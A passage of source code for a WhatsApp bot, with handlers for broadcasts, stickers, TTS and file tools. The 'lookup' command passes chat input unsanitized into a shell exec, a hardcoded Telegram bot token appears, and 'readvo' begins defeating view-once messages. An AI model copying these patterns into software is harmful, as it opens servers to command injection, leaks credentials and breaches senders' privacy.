    if (!isCreator) return m.reply('Only owner');
    if (!m.isGroup) return m.reply(mess.group);
    if (!isSewa) return m.reply(`Bot tidak disewa di Grup ini`);

    sewa.splice(_sewa.getSewaPosition(args[1] ? args[1] : from, sewa), 1);
    fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2));
    m.reply(`Sukses`);
}
break
case 'autoread': {
    if (!isCreator) return m.reply(mess.owner);
    if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`);

    if (q === 'on') {
        autoread = true;
        m.reply(`Successfully changed autoread to ${q}`);
    } else if (q === 'off') {
        autoread = false;
        m.reply(`Successfully changed autoread to ${q}`);
    }
}
break

case 'autotyping': {
    if (!isCreator) return m.reply(mess.owner);
    if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`);

    if (q === 'on') {
        autoTyping = true;
        m.reply(`Successfully changed auto-typing to ${q}`);
    } else if (q === 'off') {
        autoTyping = false;
        m.reply(`Successfully changed auto-typing to ${q}`);
    }
}
break

case 'autorecording': {
    if (!isCreator) return m.reply(mess.owner);
    if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`);

    if (q === 'on') {
        autoRecording = true;
        m.reply(`Successfully changed auto-recording to ${q}`);
    } else if (q === 'off') {
        autoRecording = false;
        m.reply(`Successfully changed auto-recording to ${q}`);
    }
}
break

case 'autorecordtyp': {
    if (!isCreator) return m.reply(mess.owner);
    if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`);

    if (q === 'on') {
        autorecordtype = true;
        m.reply(`Successfully changed auto recording and typing to ${q}`);
    } else if (q === 'off') {
        autorecordtype = false;
        m.reply(`Successfully changed auto recording and typing to ${q}`);
    }
}
break

case 'autoswview':
case 'autostatusview': {
    if (!isCreator) return m.reply(mess.owner);
    if (args.length < 1) return m.reply('on/off?');

    if (args[0] === 'on') {
        autoswview = true;
        m.reply(`${command} is enabled`);
    } else if (args[0] === 'off') {
        autoswview = false;
        m.reply(`${command} is disabled`);
    }
}
break

case 'autobio': {
    if (!isCreator) return m.reply(mess.owner);
    if (args.length < 1) return m.reply(`Example ${prefix + command} on/off`);

    if (q === 'on') {
        autobio = true;
        m.reply(`Successfully Changed AutoBio To ${q}`);
    } else if (q === 'off') {
        autobio = false;
        m.reply(`Successfully Changed AutoBio To ${q}`);
    }
}
break

case 'idgc':
case 'getidgc': {
    if (!m.isGroup) return m.reply('Khusus Di Group!');
    if (!isCreator) return m.reply('Only Owner!');

    let meta = await lilychan.groupMetadata(m.chat);
    let hasil = `乂  *G E T  G R O U P - I D*\n` +
                `◦  *Name* : ${meta.subject}\n` +
                `◦  *ID* : ${meta.id}\n` +
                `◦  *Member* : ${meta.participants.length}\n` +
                `◦  *Created* : ${moment(meta.creation * 1000).format('DD/MM/YY HH:mm:ss')}`.trim();

    m.reply(hasil);
}
break
case 'post': {
    if (!isCreator) return m.reply(`Khusus Owner Aja`);
    if (!text) return m.reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix + command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`);
    
    const axios = require('axios');
    const FormData = require('form-data');
    const fs = require('fs');

    m.reply(mess.wait); // Mengirim pesan 'wait' sementara proses berlangsung

    // Fungsi untuk mengunggah file ke layanan web Uguu
    async function uploadToUguu(filePath) {
        try {
            if (!fs.existsSync(filePath)) {
                throw new Error("File not found");
            }

            const formData = new FormData();
            formData.append('files[]', fs.createReadStream(filePath));

            const response = await axios.post('https://uguu.se/upload', formData, {
                headers: {
                    ...formData.getHeaders(),
                },
                params: {
                    output: 'json', // Meminta respons dalam format JSON
                },
            });

            if (response.status === 200 && response.data && response.data.files && response.data.files[0]) {
                return response.data.files[0].url; // Mengembalikan URL file yang diunggah
            } else {
                throw new Error(`Upload failed with status: ${response.status}`);
            }
        } catch (err) {
            throw new Error(`Upload failed: ${err.message}`);
        }
    }

    let getGroups = await lilychan.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let anu = groups.map((v) => v.id);

    for (let xnxx of anu) {
        let metadat72 = await lilychan.groupMetadata(xnxx);
        let participanh = await metadat72.participants;

        if (/image/.test(mime) || /video/.test(mime) || /audio/.test(mime)) {
            media = await lilychan.downloadAndSaveMediaMessage(quoted);
            mem = await uploadToUguu(media);
            await lilychan.sendFile(xnxx, mem, null, text.split('|')[0], ftroli );
            await sleep(text.split('|')[1]);
        } else {
            await lilychan.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) });
            await sleep(text.split('|')[1]);
        }
    }

    m.reply("*Successfully*");
}
break

case 'setnamebot':
case 'namebot': {
    if (!isCreator) return m.reply(mess.owner);
    if (!q) return m.reply('Namanya?');

    lilychan.updateProfileName(q);
    m.reply(`_Sukses mengganti nama ke *${q}*_`);
}
break

case 'bcgc':
case 'bcgroup': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`Which text?\n\nExample : ${prefix + command} Tanaka Sense Tampan`);

    let getGroups = await lilychan.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let anu = groups.map(v => v.id);

    m.reply(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`);

    for (let i of anu) {
        await sleep(1500);
        let a = `\`\`\`「 Broadcast 」\`\`\`\n\n${text}\n\nRegards,\nTanaka Senn`;
        lilychan.sendMessage(i, { text: a });
    }

    m.reply(`Successfully Sent Broadcast To ${anu.length} Group`);
}
break
case 'listgc': {
    if (!isCreator) return m.reply(`Ngapain ? Khusus Sense Aja !!`);
    
    let getGroups = await lilychan.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let anu = groups.map((v) => v.id);
    let hituet = 0;
    let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`;

    for (let x of anu) {
        let metadata2 = await lilychan.groupMetadata(x);
        teks += `❏ Group Ke ${hituet += 1}\n│◦  *NAMA :* ${metadata2.subject}\n│◦  *ID :* ${metadata2.id}\n│◦  *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`;
    }

    m.reply(teks);
}
break

case 'gcl': {
    if (!isCreator) return m.reply(`Ngapain ? Khusus Sense Aja !!`);
    
    let getGroups = await lilychan.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
    let anu = groups.map((v) => v.id);
    let hituet = 0;
    let teks = `Total Group : ${anu.length} Group\n\n`;

    for (let x of anu) {
        let metadata2 = await lilychan.groupMetadata(x);
        teks += `${hituet += 1}. ${metadata2.subject}\n`;
    }

    m.reply(teks);
}
break

case 'setppbot': {
    const jimp_1 = require('jimp');

    async function pepe(media) {
        const jimp = await jimp_1.read(media);
        const min = jimp.getWidth();
        const max = jimp.getHeight();
        const cropped = jimp.crop(0, 0, min, max);
        
        return {
            img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp_1.MIME_JPEG),
            preview: await cropped.normalize().getBufferAsync(jimp_1.MIME_JPEG)
        };
    }

    if (!isCreator) return m.reply(mess.owner);
    if (!quoted) return m.reply(`Send/Reply Image With Caption ${prefix + command}`);
    if (!/image/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`);

    try {
        let media = await lilychan.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');
        let { img } = await pepe(media);
        
        await lilychan.query({
            tag: 'iq',
            attrs: {
                to: botNumber,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [
                {
                    tag: 'picture',
                    attrs: { type: 'image' },
                    content: img
                }
            ]
        });

        m.reply('Berhasil mengganti Profile!');
    } catch (e) {
        console.log(e);
        m.reply(`Terjadi kesalahan, coba lagi nanti.`);
    }
}
break
case 'getcase': {
    const getCase = (cases) => {
        return "case " + `'${cases}'` + fs.readFileSync("./message.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break";
    }

    try {
        if (!isCreator) return m.reply('ngapain');
        if (!q) return m.reply(`contoh : ${prefix + command} antilink`);

        let nana = await getCase(q);
        m.reply(nana);
    } catch (err) {
        console.log(err);
        m.reply(`Case ${q} tidak di temukan`);
    }
}
break

case 'delcase': {
    if (!isCreator) return m.reply(`*Access Denied ❌*\n\n*Owners only*`);
    if (!q) return m.reply('*Masukan nama case yang akan di hapus*');

    dellCase('./message.js', q);
    m.reply(`Case *${text}* berhasil dihapus.`);
}
break

case 'listcase':{
const listcase = () => {
    const code = fs.readFileSync("./message.js", "utf8");
    const regex = /case\s+'([^']+)':/g;
    const matches = [];
    let match;

    while ((match = regex.exec(code))) {
        matches.push(match[1]);
    }

    let teks = `*Total Case*📑: ${matches.length} \n\n`;
    matches.forEach(x => {
        teks += "  ◦  " + x + "\n";
    });

    return teks;
 };
  let result = await listcase()
 reply(result)
}
break

case 'addcase': {
    if (!isCreator) return m.reply('lu sapa asu');
    if (!text) return m.reply('Mana case nya?');

    const fs = require('fs');
    const namaFile = 'message.js';
    const caseBaru = `${text}`;

    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return;
        }

        const posisiAwalGimage = data.indexOf("case 'addcase':");

        if (posisiAwalGimage !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    m.reply('Terjadi kesalahan saat menulis file:', err);
                } else {
                    m.reply('Case baru berhasil ditambahkan.');
                }
            });
        } else {
            m.reply('Tidak dapat menambahkan case dalam file.');
        }
    });
}
break

case 'sendcase': {
    if (!isCreator) return reply(mess.owner);
    if (!m.quoted) return m.reply('Reply pesan seseorang!');
    if (!text) return m.reply(`Contoh: ${prefix + command} xbeta`);

    const getCase = async (caseName) => {
        try {
            const fileContent = await fs.promises.readFile("./message.js", "utf-8");
            const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
            const match = fileContent.match(caseRegex);
            if (!match) {
                return m.reply(`Case '${caseName}' tidak ditemukan.`);
            }
            return match[0];
        } catch (error) {
            return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
        }
    };

    const caseName = text.trim();
    getCase(caseName)
        .then(caseCode => {
            const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
            if (!recipient || !recipient.includes('@s.whatsapp.net')) {
                return m.reply('Format ID WhatsApp tidak valid!');
            }

            const sendFeature = async (recipient, caseCode) => {
                try {
                    const contact = (await lilychan.onWhatsApp(recipient.split('@')[0]))[0] || {};
                    if (!contact) return m.reply('Kontak tidak ditemukan di WhatsApp.');

                    const message = `Hi, kamu dapet kiriman case dari owner nih!\n\n${caseCode}`;
                    await lilychan.sendMessage(recipient, { text: message }, { quoted: m });
                    m.reply('Case berhasil terkirim!');
                } catch (error) {
                    console.error('Terjadi kesalahan:', error.message);
                    m.reply('Terjadi kesalahan saat mengirim Case: ' + error.message);
                }
            };

            sendFeature(recipient, caseCode);
        })
        .catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
}
break;
case 'mute': {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins) return m.reply(mess.admin);

    if (args[0] === "on") {
        if (mute) return m.reply('Sukses Mengaktifkan Fitur!');
        mut.push(from);
        fs.writeFileSync('./system/database/mute.json', JSON.stringify(mut));
        m.reply('Success in turning on Mute in this group');

        var groupe = await lilychan.groupMetadata(from);
        var members = groupe['participants'];
        var mems = [];
        members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
        });
    } else if (args[0] === "off") {
        if (!mute) return m.reply('Sukses Menonaktifkan Fitur!');
        let off = mut.indexOf(from);
        mut.splice(off, 1);
        fs.writeFileSync('./system/database/mute.json', JSON.stringify(mut));
        m.reply('Success in turning off Mute in this group');
    } else {
        await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`);
    }
}
break

case 'banchat': {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator) return m.reply(mess.owner);

    if (args[0] === "on") {
        if (banchat) return m.reply('Sukses Banchat!');
        chatband.push(from);
        fs.writeFileSync('./system/database/banchat.json', JSON.stringify(chatband));
        m.reply('Success in turning on Banchat in this group');

        var groupe = await lilychan.groupMetadata(from);
        var members = groupe['participants'];
        var mems = [];
        members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
        });
    } else if (args[0] === "off") {
        if (!banchat) return m.reply('Sukses Unbanchat!');
        let off = chatband.indexOf(from);
        chatband.splice(off, 1);
        fs.writeFileSync('./system/database/banchat.json', JSON.stringify(chatband));
        m.reply('Success in Unbanchat in this group');
    } else {
        await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`);
    }
}
break

case 'upch': {
    if (!isCreator) return m.reply(mess.owner);
    m.reply(`Incorrect usage❌\n\nExample :\n${prefix + command}-image\n${prefix + command}-audio\n${prefix + command}-text\n\nThis feature will send messages or images that you will post on the WhatsApp channel.`);
}
break

case 'upch-image': {
    if (!isCreator) return m.reply(mess.owner);
    if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`\`\`\`🚩 Reply Image with ${prefix + command} Tulis Caption-nya\`\`\``);

    lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    media = await lilychan.downloadAndSaveMediaMessage(quoted);
    let anu = await uploadToUguu(media);

    lilychan.sendMessage(`${global.idch}`, {
        image: {
            url: `${util.format(anu)}`
        },
        caption: text,
        contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363285176234746@newsletter',
                serverMessageId: 20,
                newsletterName: '❃ Lilychanj - Assistant'
            },
            externalAdReply: {
                title: "Lilychanj - Wabot",
                body: "",
                thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg",
                sourceUrl: null,
                mediaType: 1
            },
        }
    });

    await sleep(2000);
    lilychan.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break

case 'upch-audio': {
    if (!isCreator) return m.reply(mess.owner);
    if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Use ${prefix + command} Judul Lagu|Terserah\n\nExample ${prefix + command} Mungkin | Kita Sad Dulu`);

    lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    ngawi = text.split("|")[0];
    jomokck = text.split("|")[1];
    await sleep(6000);

    lilychan.sendMessage(`${global.idch}`, {
        audio: await quoted.download(),
        mimetype: 'audio/mp4',
        ptt: true,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363285176234746@newsletter',
                serverMessageId: 20,
                newsletterName: '❃ Lilychanj - Assistant'
            },
            externalAdReply: {
                title: ngawi,
                body: jomokck,
                thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg",
                sourceUrl: null,
                mediaType: 1
            }
        }
    });

    // lilychan.sendMessage(`${global.idch}`, { audio: await quoted.download(), mimetype: 'audio/mp4', ptt: true });
    await sleep(2000);
    lilychan.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break

case 'upch-text': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply('```🚩 Masukan Text Yang Ingin Di Post Ke Saluran```');

    lilychan.sendMessage(`${global.idch}`, {
        text: `${text}`,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363285176234746@newsletter',
                serverMessageId: 20,
                newsletterName: '❃ Lilychanj - Assistant'
            },
            externalAdReply: {
                title: "Lilychanj - Wabot",
                body: "",
                thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg",
                sourceUrl: null,
                mediaType: 1
            }
        }
    });
}
break

case 'disk': {
  let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

  await m.reply(`Please Wait`)
  let o
  try {
    o = await exec('cd && du -h --max-depth=1')
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim())
    m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
  }
}
break
case 'getinfofiles': {
  let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

  await m.reply(`Please Wait`)
  let o
  try {
    o = await exec('du -hsc *')
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim())
    m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
  }
}
break
case 'listfiles': {
  let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

  await m.reply(`Please Wait`)
  let o
  try {
    o = await exec('ls -R *')
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim())
    m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
  }
}
break
case 'lookup': {
  if (!text) return m.reply("Example: .lookup https://www.example.com")
  let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

  await m.reply(`Please Wait`)
  let o
  try {
    o = await exec('nslookup ' + text)
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim())
    m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
  }
}
break
case 'server': {
  let cp = require ('child_process')
let { promisify } = require ('util')
let exec = promisify(cp.exec).bind(cp)

  await m.reply(`Please Wait`)
  let o
  try {
    o = await exec('df -h')
  } catch (e) {
    o = e
  } finally {
    let { stdout, stderr } = o
    if (stdout.trim())
    m.reply(stdout)
    if (stderr.trim()) m.reply(stderr)
  }
}
break
 
case 'setcmd': {
    if (!m.quoted) return m.reply('Reply Message!');
    if (!m.quoted.fileSha256) return reply('SHA256 Hash Missing');
    if (!text) return m.reply(`For What Command?`);

    let hash = m.quoted.fileSha256.toString('base64');
    if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) {
        return reply('You have no permission to change this sticker command');
    }

    global.db.data.sticker[hash] = {
        text,
        mentionedJid: m.mentionedJid,
        creator: m.sender,
        at: +new Date(),
        locked: false,
    };

    m.reply(`Done!`);
}
break

case 'delcmd': {
    let hash = m.quoted.fileSha256.toString('base64');
    if (!hash) return m.reply(`No hashes`);
    if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) {
        return m.reply('You have no permission to delete this sticker command');
    }

    delete global.db.data.sticker[hash];
    m.reply(`Done!`);
}
break

case 'listcmd': {
    let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim();

    lilychan.sendText(m.chat, teks, m, {
        mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a, b) => [...a, ...b], [])
    });
}
break
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Lilychanj 
                   < STICKER FITUR >

*/
//<================================================>//
case "stickers": {
    if (!text) return m.reply(`Ex : ${prefix + command} kucing`);

    const anu = await stickersearch(text);
    const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
    const randomStickers = shuffledStickers.slice(0, 10);

    if (randomStickers.length > 0) {
        for (let i = 0; i < randomStickers.length; i++) {
            try {
                await new Promise(resolve => setTimeout(resolve, i * 1000));
                await lilychan.sendImageAsSticker(m.chat, randomStickers[i], m, {
                    packname: global.packname,
                    author: global.author
                });
            } catch (error) {
                console.error(`Error sending file: ${error.message}`);
                await m.reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
            }
        }
    }
}
break

case 'qc': {
    const { quote } = require('./lib/quote.js');
    let text;

    if (args.length >= 1) {
        text = args.slice(0).join(" ");
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text;
    } else {
        return m.reply("Input teks atau reply teks yang ingin di jadikan quote!");
    }

    if (!text) return m.reply('masukan text');
    if (text.length > 30) return m.reply('Maksimal 30 Teks!');

    let ppnyauser = await lilychan.profilePictureUrl(m.sender, 'image').catch(_ => 'https://h.top4top.io/p_31922c8vs1.jpg');
    const rest = await quote(text, pushname, ppnyauser);
    lilychan.sendImageAsSticker(m.chat, rest.result, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    });
}
break

case 'sticker':
case 'stiker':
case 's': {
    if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`);

    if (/image/.test(mime)) {
        let media = await quoted.download();
        let encmedia = await lilychan.sendImageAsSticker(m.chat, media, m, {
            packname: global.packname,
            author: global.author
        });
        await fs.unlinkSync(encmedia);
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!');
        let media = await quoted.download();
        let encmedia = await lilychan.sendVideoAsSticker(m.chat, media, m, {
            packname: global.packname,
            author: global.author
        });
        await fs.unlinkSync(encmedia);
    } else {
        return m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`);
    }
}
break
 
case 'smeme': {
    let respond = `Send/Reply image with caption ${prefix + command} txt-bawah|txt-atas`;
    if (!/image/.test(mime)) return m.reply(respond);
    if (!text) return m.reply(respond);

    m.reply(mess.wait);
    const atas = text.split('|')[0] ? text.split('|')[0] : '-';
    const bawah = text.split('|')[1] ? text.split('|')[1] : '-';
    
    let dwnld = await lilychan.downloadAndSaveMediaMessage(qmsg);
    let fatGans = await uploadToUguu(dwnld);
    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`;
    
    let pop = await lilychan.sendImageAsSticker(m.chat, smeme, m, {
        packname: packname,
        author: author
    });
    fs.unlinkSync(pop);
}
break

case 'stickerwm':
case 'swm':
case 'curi':
case 'colong':
case 'take':
case 'wm':
case 'sgifwm': {
    if (!m.quoted) return m.reply('Reply with a sticker!');
    let stiker = false;

    try {
        let [packname, ...author] = text.split('|');
        author = (author || []).join('|');
        let mime = m.quoted.mimetype || '';

        if (!/webp/.test(mime)) throw 'Reply with a sticker!';
        let img = await m.quoted.download();

        if (!img) throw 'Failed to download sticker!';
        stiker = await addExif(img, packname || global.packname, author || global.author);
    } catch (e) {
        console.error(e);
        if (Buffer.isBuffer(e)) stiker = e;
        else throw 'An error occurred: ' + e;
    } finally {
        if (stiker) {
            lilychan.sendFile(m.chat, stiker, 'wms.webp', '', m, false, { asSticker: true });
        } else {
            throw 'Conversion failed';
        }
    }
}
break

case 'cls': {
    if (!m.quoted) return m.reply('Reply with a sticker!');
    let stiker = false;

    try {
        let [packname, ...author] = text.split('|');
        author = (author || []).join('|');
        let mime = m.quoted.mimetype || '';

        if (!/webp/.test(mime)) throw 'Reply with a sticker!';
        let img = await m.quoted.download();

        if (!img) throw 'Failed to download sticker!';
        stiker = await addExif(img, packname || global.packname, author || global.author);
    } catch (e) {
        console.error(e);
        if (Buffer.isBuffer(e)) stiker = e;
        else throw 'An error occurred: ' + e;
    } finally {
        if (stiker) {
            lilychan.sendFile(m.chat, stiker, 'wms.webp', '', m, false, { asSticker: true });
        } else {
            throw 'Conversion failed';
        }
    }
}
break
 
case 'tts-jepang': {
    const defaultLang = 'ja';
    const gtts = require('node-gtts');
    let jawir;

    if (args.length === 0 || !args[0]) {
        return m.reply('Textnya Mana kak?¿');
    } else {
        jawir = args[0];
    }

    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }

    let kampang = `${text}`;

    function tts(kampang, lang = 'id') {
        return new Promise((resolve, reject) => {
            try {
                let tts = gtts(lang);
                let filePath = (1 * new Date) + '.mp3';
                tts.save(filePath, text, () => {
                    resolve(fs.readFileSync(filePath));
                    fs.unlinkSync(filePath);
                });
            } catch (e) {
                reject(e);
            }
        });
    }

    let res;
    try {
        res = await tts(kampang, lang);
    } catch (e) {
        m.reply(e + '');
        res = await tts(kampang, defaultLang);
    } finally {
        if (res) {
            await lilychan.sendMessage(m.chat, {
                audio: res,
                ptt: true,
                mimetype: "audio/mpeg",
                fileName: "vn.mp3",
                waveform: [100, 0, 100, 0, 100, 0, 100]
            }, { quoted: m });
        }
    }
}
break

case 'tts': {
    const defaultLang = 'id';
    const gtts = require('node-gtts');
    let jawir;

    if (args.length === 0 || !args[0]) {
        return m.reply('Textnya Mana kak?¿');
    } else {
        jawir = args[0];
    }

    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }

    let kampang = `${text}`;

    function tts(kampang, lang = 'id') {
        return new Promise((resolve, reject) => {
            try {
                let tts = gtts(lang);
                let filePath = (1 * new Date) + '.mp3';
                tts.save(filePath, text, () => {
                    resolve(fs.readFileSync(filePath));
                    fs.unlinkSync(filePath);
                });
            } catch (e) {
                reject(e);
            }
        });
    }

    let res;
    try {
        res = await tts(kampang, lang);
    } catch (e) {
        m.reply(e + '');
        res = await tts(kampang, defaultLang);
    } finally {
        if (res) {
            await lilychan.sendMessage(m.chat, {
                audio: res,
                ptt: true,
                mimetype: "audio/mpeg",
                fileName: "vn.mp3",
                waveform: [100, 0, 100, 0, 100, 0, 100]
            }, { quoted: m });
        }
    }
}
break

case 'ttp': {
    if (!args[0]) return m.reply(`Tidak ada teks yang diberikan`);

    const { createCanvas } = require('canvas');
    const size = 400;
    const canvas = createCanvas(size, size);
    const context = canvas.getContext('2d');

    context.fillStyle = '#000000'; // Hitam rek
    context.fillRect(0, 0, size, size);

    const text = args.join(' ');
    context.fillStyle = '#ffffff';
    context.font = '38px Tahoma';
    const textWidth = context.measureText(text).width;
    const x = size / 2;
    const y = size / 2;
    context.textAlign = 'center';
    context.fillText(text, x, y);

    const imageUrl = canvas.toDataURL();
    lilychan.sendImageAsSticker(m.chat, imageUrl, m, {
        packname: global.packname,
        author: global.author
    });
}
break

case 'stickertele':
case 'telestik':
case 'stiktele':
case 'telesticker': {
    async function telesticker(url) {
        return new Promise(async (resolve, reject) => {
            const packName = url.replace("https://t.me/addstickers/", "");
            const data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {
                method: "GET",
                headers: { "User-Agent": "GoogleBot" }
            });

            const hasil = [];
            for (let i = 0; i < data.data.result.stickers.length; i++) {
                const fileId = data.data.result.stickers[i].thumb.file_id;
                const data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`);
                const result = {
                    url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
                };
                hasil.push(result.url);
            }
            resolve(hasil);
        });
    }

    if (!text) return m.reply(`Masukan Imput Url\n\nExample: ${prefix + command} https://t.me/addstickers/video_5609982615_by_prinzeugen_robot`);

    let results = await telesticker(text);
    if (results.length > 0) {
        m.reply(mess.wait);
        results.forEach((result) => {
            lilychan.sendFile(m.chat, result, 'wms.webp', '', m, false, { asSticker: true });
        });
    } else {
        m.reply('Tidak Ada Hasil.');
    }
}
break
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Lilychanj 
                   < TOOLS FITUR >

*/
//<================================================>//
case "tr": {
    let lang, text;

    if (args.length >= 2) {
        lang = args[0] ? args[0] : 'id';
        text = args.slice(1).join(' ');
    } else if (m.quoted && m.quoted.text) {
        lang = args[0] ? args[0] : 'id';
        text = m.quoted.text;
    } else {
        throw `Ex: ${prefix + command} id hello i am robot`;
    }

    const translate = require('@vitalets/google-translate-api');
    let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null);

    if (!res) return m.reply(`Error: Bahasa "${lang}" Tidak Support`);
    m.reply(`*Terdeteksi Bahasa:* ${res.from.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim());
}
break

case 'remini':
case 'hd': {
    if (!quoted) return m.reply(`Balas Image Dengan Caption ${prefix + command}`);
    if (!/image/.test(mime)) return m.reply("Hanya support gambar");

    let media = await quoted.download();
    const This = await remini(media, "enhance");
    lilychan.sendFile(m.chat, This, "", "Done", m);
}
break

case "kalkulator": {
    val = text
        .replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
        .replace(/×/g, '*')
        .replace(/÷/g, '/')
        .replace(/π|pi/gi, 'Math.PI')
        .replace(/e/gi, 'Math.E')
        .replace(/\/+/g, '/')
        .replace(/\++/g, '+')
        .replace(/-+/g, '-');

    let format = val
        .replace(/Math\.PI/g, 'π')
        .replace(/Math\.E/g, 'e')
        .replace(/\//g, '÷')
        .replace(/\*×/g, '×');

    try {
        console.log(val);
        let result = (new Function('return ' + val))();
        if (!result) throw result;
        m.reply(`*${format}* = _${result}_`);
    } catch (e) {
        if (e == undefined) return m.reply('Isinya?');
        m.reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport');
    }
}
break

case 'readvo':
case 'rvo': {
    if (!m.quoted) return m.reply('Reply gambar/video yang ingin Anda lihat');
    if (m.quoted.mtype !== 'viewOnceMessageV2') return m.reply('Ini bukan pesan view-once.');

    let msg = m.quoted.message;
    let type = Object.keys(msg)[0];
    const { downloadContentFromMessage } = require('@adiwajshing/baileys');

